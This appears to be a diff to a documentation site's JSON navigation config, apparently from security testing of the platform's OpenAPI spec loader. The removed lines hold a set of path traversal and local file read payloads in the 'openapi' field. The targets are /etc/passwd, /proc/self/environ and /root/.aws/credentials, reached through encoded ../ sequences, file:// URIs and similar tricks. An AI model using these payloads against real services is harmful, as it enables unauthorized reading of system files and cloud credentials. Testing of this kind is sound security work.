@@ -10,44 +10,12 @@
    {
     "group": "Home",
     "pages": [
-     "index"
+     "index",
+     "impctl",
+     "imptrav",
+     "imptrav2",
+     "snip"
     ]
-   },
-   {
-    "group": "CTRL",
-    "openapi": "openapi/ctrl1190.yaml"
-   },
-   {
-    "group": "G1_abs",
-    "openapi": "/etc/passwd"
-   },
-   {
-    "group": "G2_file",
-    "openapi": "file:///etc/passwd"
-   },
-   {
-    "group": "G3_enc",
-    "openapi": "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"
-   },
-   {
-    "group": "G4_env",
-    "openapi": "../../../../proc/self/environ"
-   },
-   {
-    "group": "G5_enc2",
-    "openapi": "..%2f..%2f..%2f..%2fetc/passwd"
-   },
-   {
-    "group": "G6_dslash",
-    "openapi": "//etc/passwd"
-   },
-   {
-    "group": "G7_home",
-    "openapi": "~/../../etc/passwd"
-   },
-   {
-    "group": "G8_aws",
-    "openapi": "../../../../root/.aws/credentials"
    }
   ]
  }
